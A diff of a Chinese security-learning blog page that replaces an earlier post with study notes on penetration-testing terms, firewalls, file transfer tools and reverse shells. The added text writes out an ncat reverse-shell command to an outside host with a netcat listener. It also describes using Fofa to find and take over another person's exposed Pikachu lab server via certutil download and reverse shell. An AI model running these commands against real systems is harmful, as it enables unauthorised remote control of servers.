@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>绕过姿势收藏 | f4k3r&#39;s blog</title>
+  <title>Web学习1 | f4k3r&#39;s blog</title>
   <meta name="keywords" content=" Web ">
-  <meta name="description" content="绕过姿势收藏 | f4k3r&#39;s blog">
+  <meta name="description" content="Web学习1 | f4k3r&#39;s blog">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="网站搭建前置知识域名，子域名，DNS，HTTP&#x2F;HTTPS,证书等如何搭建一个网站：1、准备一个域名（阿里云购买）2、购买一个服务器（阿里云）3、宝塔一键部署 WEB应用架构类理解不同WEB应用组成角色功能架构：开发语言，程序源码，中间件容器，数据库类型，服务器操作系统，第三方软件等开发语言：asp，php，aspx，jsp，java，python，ruby，go，html，javasc">
 <meta property="og:type" content="article">
@@ -251,9 +251,9 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-绕过姿势收藏" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-Web学习1" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">绕过姿势收藏</h1>
+        <h1 class="article-title">Web学习1</h1>
     
     <div class="article-meta">
         
@@ -270,7 +270,7 @@
     </div>
     <div class="article-meta">
         
-            发布时间 : <time class="date" title='最后更新: 2024-04-28 19:57:38'>2024-04-28 19:55</time>
+            发布时间 : <time class="date" title='最后更新: 2024-05-23 19:18:09'>2024-05-22 20:44</time>
         
     </div>
     <div class="article-meta">
@@ -281,7 +281,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#flag%E5%AD%97%E7%AC%A6%E8%A2%AB%E8%BF%87%E6%BB%A4%E6%97%B6"><span class="toc-text">flag字符被过滤时</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8D%E8%AF%8D%E8%A7%A3%E9%87%8A"><span class="toc-text">名词解释</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90"><span class="toc-text">权限</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%B2%E7%81%AB%E5%A2%99"><span class="toc-text">防火墙</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B8%8B%E8%BD%BD-%E8%A7%A3%E5%86%B3%E6%97%A0%E5%9B%BE%E5%BD%A2%E5%8C%96-%E8%A7%A3%E5%86%B3%E6%95%B0%E6%8D%AE%E4%BC%A0%E8%BE%93"><span class="toc-text">文件上传下载-解决无图形化&amp;解决数据传输</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell%E5%91%BD%E4%BB%A4-%E8%A7%A3%E5%86%B3%E6%95%B0%E6%8D%AE%E5%9B%9E%E6%98%BE-%E8%A7%A3%E5%86%B3%E6%95%B0%E6%8D%AE%E9%80%9A%E8%AE%AF"><span class="toc-text">反弹shell命令-解决数据回显&amp;解决数据通讯</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E4%BE%8B1%EF%BC%88%E9%98%B2%E7%81%AB%E5%A2%99%E7%BB%95%E8%BF%87-%E6%AD%A3%E5%90%91%E8%BF%9E%E6%8E%A5-%E5%8F%8D%E5%90%91%E8%BF%9E%E6%8E%A5-%E5%86%85%E7%BD%91%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%89"><span class="toc-text">实例1（防火墙绕过-正向连接&amp;反向连接&amp;内网服务器）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E4%BE%8B2%EF%BC%9AFofa%E6%8B%BF%E4%B8%8B%E5%90%8C%E8%A1%8CPikachu%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="toc-text">实例2：Fofa拿下同行Pikachu服务器</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">总结</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -297,7 +297,39 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="flag字符被过滤时"><a href="#flag字符被过滤时" class="headerlink" title="flag字符被过滤时"></a>flag字符被过滤时</h2><p>①：[^e]表示除了e以外的所有字母，这样可以顺利匹配到flag</p>
+        <h2 id="名词解释"><a href="#名词解释" class="headerlink" title="名词解释"></a>名词解释</h2><p><strong>POC</strong>：全称”Proof of Concept”，中文’概念验证’，常指一段漏洞证明的代码。<br><strong>EXP</strong>：全称”Exploit”,中文”利用“，指利用系统漏洞进行攻击的动作。<br><strong>Payload</strong>：中文“有效载荷”，指成功exploit之后，真正在目标系统之星的代码或指令。<br><strong>Shellcode</strong>：简单翻译“shell代码”，是Payload的一种，由于其建立正向&#x2F;反向shell而得名。<br><strong>黑盒测试</strong>：黑盒测试是一种软件测试方法，测试人员在没有了解内部实现细节的情况下，对系统进行测试。测试人员只关注系统的输入和输出，目的是评估系统的功能和安全性。<br><strong>白盒测试</strong>：白盒测试是一种软件测试方法，测试人员具有对系统内部的详细了解，包括代码和结构。测试人员可以检查系统的内部逻辑和实现，以评估系统的正确性和安全性。<br><strong>社会工程学</strong>：社会工程学是一种欺骗性的攻击方法，通过对人类心理和行为的研究，以及各种欺骗手段，骗取他人的信息或获取未授权的访问权限。<br><strong>木马</strong>：木马（Trojan horse）是一种隐藏在看似合法的程序中的恶意软件。它通过欺骗用户，使其误以为这是一个有用的软件，但实际上会在用户不知情的情况下执行某种恶意操作，如窃取信息、开启后门等。<br><strong>后门&#x2F;Webshell</strong>：Webshell是一种恶意软件，通常以脚本或小型程序的形式嵌入到受攻击的Web服务器中。攻击者通过Webshell可以执行远程命令，获取服务器的敏感信息，甚至对服务器进行完全的控制。</p>
+<h2 id="权限"><a href="#权限" class="headerlink" title="权限"></a>权限</h2><p>文件权限，服务权限，用户权限 -&gt; 提权<br>权限体现：文件能否删除，能否修改<br>查询用户名命令：whoami（ Linux中 whoami 命令用于显示自身用户名称。）<br>Administrator是一个组，组没有权限，组下的用户也会没有权限访问文件。<br>提权的作用：能够进行更多的命令操作<br>取得管理员权限，是无法把系统直接删掉的，需要进行提权操作，取得系统权限才可以。</p>
+<h2 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h2><p>linux自带的防火墙：iptables<br>内网渗透测试：走的协议与一般测试不同，走tcp协议<br>防火墙的出站与入站：出站是从本地计算机访问外部网络，例如浏览器发起请求访问网站，入站是从外部网络访问本地计算机，例如使用 localsend 将文件从手机（外部网络）传送到本地计算机。</p>
+<h2 id="文件上传下载-解决无图形化-解决数据传输"><a href="#文件上传下载-解决无图形化-解决数据传输" class="headerlink" title="文件上传下载-解决无图形化&amp;解决数据传输"></a>文件上传下载-解决无图形化&amp;解决数据传输</h2><p>Linux：wget curl（linux自带的） python ruby perl java等<br>Windows： PowerShell Certutil Bitsadmin msiexec mshta rund1132等</p>
+<p>可以下载自己所需要的渗透工具到对方的服务器里</p>
+<h2 id="反弹shell命令-解决数据回显-解决数据通讯"><a href="#反弹shell命令-解决数据回显-解决数据通讯" class="headerlink" title="反弹shell命令-解决数据回显&amp;解决数据通讯"></a>反弹shell命令-解决数据<em>回显</em>&amp;解决数据通讯</h2><p><strong>反弹</strong>名词解释：将权限移植到另一个地方<br>useradd 用户名 passwd 用户名<br>passwd：修改用户名的密码<br>测试Linux系统添加用户或修改密码命令交互回显问题</p>
+<h2 id="实例1（防火墙绕过-正向连接-反向连接-内网服务器）"><a href="#实例1（防火墙绕过-正向连接-反向连接-内网服务器）" class="headerlink" title="实例1（防火墙绕过-正向连接&amp;反向连接&amp;内网服务器）"></a>实例1（防火墙绕过-正向连接&amp;反向连接&amp;内网服务器）</h2><p><img src="/2024/05/22/Web%E5%AD%A6%E4%B9%A01/image-20240522215517964.png"></p>
+<p>正向连接：我主动找你<br>反向连接：别人来找我<br>要看是以谁为参照物<br>windows进行nc操作，是windows正向连接linux，linux收到windows的数据，是进行了反向连接。</p>
+<p>在学校的内网可以直接控制阿里云的外网服务器，但是阿里云在进行回显的时候并不知道将数据回显到哪台电脑。</p>
+<p>内网-&gt;aliyun 可以<br>aliyun-&gt;内网 不可以<br>因为aliyun无法分辨哪个电脑对应着数据的来源<br>解决方法：进行端口映射，当外网将数据传输到内网时，当端口为5577时，自动映射到C电脑，这样就可以解决无法反弹的问题。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">nc介绍:nc是netcat的简写，是一个功能强大的网络工具，有着网络界的瑞士军刀美誉。nc命令在linux系统中实际命令是ncat，nc是软连接到ncat。nc命令的主要作用如下：</span><br><span class="line">实现任意TCP/UDP端口的侦听，nc可以作为server以TCP或UDP方式侦听指定端口</span><br><span class="line">端口的扫描，nc可以作为client发起TCP或UDP连接</span><br><span class="line">机器之间传输文件</span><br><span class="line">机器之间网络测速</span><br></pre></td></tr></table></figure>
+<p>nc可以将本地cmd的权限移交到外网上去<br>ping 命令可以得到网站的ip地址</p>
+<p><img src="/2024/05/22/Web%E5%AD%A6%E4%B9%A01/image-20240522220309234.png"></p>
+<p>-lvvp可以监听5577端口</p>
+<p><img src="/2024/05/22/Web%E5%AD%A6%E4%B9%A01/image-20240522220613534.png"></p>
+<p>成功接收到内网传输的数据，完成了一次成功的反弹shell，此时我在真机上执行什么命令，虚拟机上也会相应的执行对应的命令，因为它已经把cmd的权限交给真机了。 </p>
+<p><img src="/2024/05/22/Web%E5%AD%A6%E4%B9%A01/image-20240522221542195.png" alt="image-20240522221542195"></p>
+<p>在真机上执行命令ncat <a target="_blank" rel="noopener" href="http://www.xiaodi8.com/">www.xiaodi8.com</a> 5566 -e &#x2F;bin&#x2F;bash<br>在虚拟机上执行nc -lvvp 5566 即可完成一次反弹shell<br>防火墙可以将nc连接的命令过滤掉，这是防火墙的作用之一<br>防火墙默认设置：出松进紧</p>
+<h2 id="实例2：Fofa拿下同行Pikachu服务器"><a href="#实例2：Fofa拿下同行Pikachu服务器" class="headerlink" title="实例2：Fofa拿下同行Pikachu服务器"></a>实例2：Fofa拿下同行Pikachu服务器</h2><p>文件下载&amp;反弹shell：<br>certutil -urlc</p>
+<img src="/2024/05/22/Web%E5%AD%A6%E4%B9%A01/image-20240522223419235.png" style="zoom:50%;">
+
+
+
+
+
+<p>先判断哪个ip地址可以ping通，</p>
+<p><img src="/2024/05/22/Web%E5%AD%A6%E4%B9%A01/image-20240522223733382.png"></p>
+<p>下载nc文件到对方服务器</p>
+<p><img src="/2024/05/22/Web%E5%AD%A6%E4%B9%A01/image-20240522223824813.png"></p>
+<p>反弹shell到5566端口自己的服务器</p>
+<p><img src="/2024/05/22/Web%E5%AD%A6%E4%B9%A01/image-20240522223940035.png"></p>
+<p>用自己的服务器监听，看回显，成功get shell，服务器到手。</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>操作系统：文件下载、反弹shell（正向反向连接）、用途（个人用机，服务器用机）、命令（windows-cmd、powershell，linux）、权限、防火墙（出站，入站），网络（内网&amp;外网）<br>专有名词：前后端，POC&#x2F;EXP，Payload&#x2F;Shellcode，后门&#x2F;Webshell，木马&#x2F;病毒，反弹，回显，跳板，黑白盒测试，暴力破解，社会工程学，撞库，attack等</p>
 
       
        
